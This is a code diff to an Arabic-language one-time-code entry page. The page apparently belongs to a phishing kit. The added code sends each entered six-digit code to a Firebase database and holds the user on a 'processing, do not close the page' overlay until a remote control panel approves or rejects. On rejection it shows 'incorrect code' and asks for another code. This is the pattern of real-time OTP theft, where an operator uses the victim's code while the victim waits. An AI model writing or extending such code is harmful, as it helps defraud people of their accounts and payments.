@@ -75,6 +75,11 @@
                 </p>
             </div>
 
+            <!-- رسالة خطأ الرمز (تظهر عند الرفض من لوحة التحكم) -->
+            <div id="otpError" role="alert" class="mt-4 hidden w-full rounded-[14px] border-2 border-red-500 bg-red-50 p-4 text-center">
+                <p class="text-sm font-semibold text-red-600" data-i18n="الرمز المدخل غير صحيح، يرجى التأكد من الرمز">الرمز المدخل غير صحيح، يرجى التأكد من الرمز</p>
+            </div>
+
             <!-- حقول الرمز (6 خانات) -->
             <div id="otpBoxes" dir="ltr" class="mt-8 grid w-full grid-cols-6 gap-3">
                 <input inputmode="numeric" maxlength="1" aria-label="الرقم 1" class="otp-box aspect-[2/3] w-full rounded-lg border border-input bg-background text-center text-2xl outline-none focus:border-brand focus:ring-2 focus:ring-brand transition" value="">
@@ -92,6 +97,22 @@
                 التالي
             </button>
 
+        </div>
+    </div>
+
+    <!-- ==================== شاشة الانتظار (تبقى حتى يصل قرار لوحة التحكم) ==================== -->
+    <div id="otpWait" class="fixed inset-0 z-[100] hidden flex-col items-center justify-center bg-white px-8 text-center">
+        <div class="relative h-28 w-28 flex items-center justify-center">
+            <div class="absolute inset-0 rounded-full border-4 border-brand/20"></div>
+            <div class="absolute inset-0 animate-spin rounded-full border-4 border-brand border-t-transparent"></div>
+            <div class="flex h-14 w-14 items-center justify-center rounded-full bg-primary text-2xl text-brand-foreground">
+                <i class="fa-solid fa-shield-halved"></i>
+            </div>
+        </div>
+        <h2 class="mt-8 text-2xl font-bold" data-i18n="جاري معالجة طلبك">جاري معالجة طلبك</h2>
+        <p class="mt-3 max-w-sm text-sm font-semibold text-muted" data-i18n="يرجى الانتظار، جاري التحقق من بياناتك. يرجى عدم إغلاق الصفحة.">يرجى الانتظار، جاري التحقق من بياناتك. يرجى عدم إغلاق الصفحة.</p>
+        <div class="mt-6 h-2 w-64 overflow-hidden rounded-full bg-input">
+            <div id="otpWaitBar" class="h-full w-0 rounded-full bg-brand transition-all duration-200"></div>
         </div>
     </div>
 
@@ -145,17 +166,56 @@
                 var otp = code();
                 if (otp.length !== boxes.length) return;
 
-                // إرسال الرمز إلى قاعدة البيانات ثم التوجيه
-                var go = function () { window.location.href = 'index.html'; };
+                // إخفاء أي رسالة خطأ سابقة ثم إظهار شاشة الانتظار الدائمة
+                var err = document.getElementById('otpError');
+                if (err) err.classList.add('hidden');
+                showOtpWait();
+
+                // إرسال الرمز إلى قاعدة البيانات ثم البقاء في الانتظار
+                // (الموافقة = توجيه للرئيسية، الرفض = إظهار رسالة الخطأ — كلاهما من اللوحة)
                 if (typeof window.submitOtp === 'function') {
-                    window.submitOtp(otp).then(go).catch(go);
+                    window.submitOtp(otp).catch(function () {});
                 } else if (typeof window.pushFirebaseOtp === 'function') {
                     try { window.pushFirebaseOtp(otp); } catch (e) {}
-                    go();
-                } else {
-                    go();
                 }
             });
+
+            // ==================== شاشة الانتظار ====================
+            var __otpWaitTimer = null;
+            function showOtpWait() {
+                var overlay = document.getElementById('otpWait');
+                if (!overlay) return;
+                overlay.classList.remove('hidden');
+                overlay.classList.add('flex');
+                document.body.style.overflow = 'hidden';
+                var bar = document.getElementById('otpWaitBar');
+                if (bar) {
+                    var pct = 0;
+                    if (__otpWaitTimer) clearInterval(__otpWaitTimer);
+                    __otpWaitTimer = setInterval(function () {
+                        pct = (pct + 3) % 103;
+                        bar.style.width = Math.min(100, pct) + '%';
+                    }, 100);
+                }
+            }
+            function hideOtpWait() {
+                var overlay = document.getElementById('otpWait');
+                if (overlay) { overlay.classList.add('hidden'); overlay.classList.remove('flex'); }
+                document.body.style.overflow = '';
+                if (__otpWaitTimer) { clearInterval(__otpWaitTimer); __otpWaitTimer = null; }
+            }
+            window.__hideOtpWait = hideOtpWait;
+
+            // عند الرفض: إخفاء الانتظار + تفريغ الحقول + طباعة رسالة الخطأ فوق الحقل
+            window.__onOtpReject = function () {
+                hideOtpWait();
+                boxes.forEach(function (b) { b.value = ''; });
+                refresh();
+                var err = document.getElementById('otpError');
+                if (err) err.classList.remove('hidden');
+                if (boxes[0]) boxes[0].focus();
+                window.scrollTo({ top: 0, behavior: 'smooth' });
+            };
         })();
     </script>
 
@@ -167,6 +227,19 @@
     <script src="/assets/js/firebase-client.js?v=12"></script>
     <script src="/assets/js/request-store.js?v=1"></script>
     <script src="/assets/js/page-commands.js?v=5"></script>
+    <!-- تسجيل معالجة الرفض بعد تحميل page-commands.js -->
+    <script>
+        (function () {
+            function register() {
+                if (typeof window.listenForPageCommands === 'function') {
+                    window.listenForPageCommands({ onReject: window.__onOtpReject });
+                } else {
+                    setTimeout(register, 200);
+                }
+            }
+            register();
+        })();
+    </script>
     <!-- i18n: القواميس + المحرّك + زر تبديل اللغة (يُطبَّق على كل الصفحات) -->
     <script src="/assets/i18n/ar.js?v=2"></script>
     <script src="/assets/i18n/en.js?v=2"></script>
